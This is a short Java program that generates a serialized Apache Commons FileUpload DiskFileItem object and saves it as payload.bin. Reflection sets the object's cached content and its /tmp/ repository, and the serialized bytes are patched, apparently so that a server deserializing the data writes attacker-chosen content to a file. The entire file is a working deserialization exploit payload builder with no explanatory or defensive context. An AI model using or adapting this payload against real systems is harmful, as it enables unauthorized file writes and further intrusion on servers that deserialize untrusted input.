import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.FileUtils;


public class CreatePayloadCreateFile {

	public static void main(String[] args) throws Exception {
		DiskFileItem f = new DiskFileItem("", "", false, "", 0x12345678, null);
		OutputStream dfos = f.getOutputStream();
		dfos.write(new byte[10]);
		f.delete();

		Field fCachedContent = f.getClass().getDeclaredField("cachedContent");
		fCachedContent.setAccessible(true);
		fCachedContent.set(f, "Hello!".getBytes());
		Field fRepository = f.getClass().getDeclaredField("repository");
		fRepository.setAccessible(true);
		fRepository.set(f, new File("/tmp/"));

		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream out = new ObjectOutputStream(bos);
		out.writeObject(f);
		out.close();
		byte[] data = bos.toByteArray();
		for (int i = 0; i + 3 < data.length; i++) {
			if (data[i] == 0x12
					&& data[i + 1] == 0x34
					&& data[i + 2] == 0x56
					&& data[i + 3] == 0x78) {
				System.out.println(i);
				data[i] = 0;
				data[i+1] = 0;
				data[i+2] = 0;
				data[i+3] = 1;
			}
		}
		FileUtils.writeByteArrayToFile(new File("payload.bin"), data);
	}
}
